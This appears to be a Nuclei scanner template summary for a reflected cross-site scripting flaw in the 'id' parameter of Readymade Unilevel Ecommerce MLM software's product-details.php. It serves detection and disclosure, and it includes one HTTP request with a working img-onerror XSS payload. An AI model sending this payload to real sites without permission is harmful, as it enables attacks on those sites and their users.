# Nuclei Template: Readymade Unilevel Ecommerce MLM - Cross-Site Scripting
**Template ID:** readymade-unilevel-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** High
**Source:** Nuclei Template (`readymade-unilevel-xss.yaml`)

## Vulnerability Information & PoC

## Description
Readymade Unilevel Ecommerce software has xss vulnerability in product-details.php?id

## Steps to reproduce / Exploit Payload
```http
GET /product-details.php?id=1"><img/src/onerror=.1|alert`{{num1}}`+class={{num1}}> HTTP/1.1
Host: {{Hostname}}
```

## References
- https://packetstormsecurity.com/files/179886/ReadyMade-Unilevel-Ecommerce-MLM-Blind-SQL-Injection-Cross-Site-Scripting.html
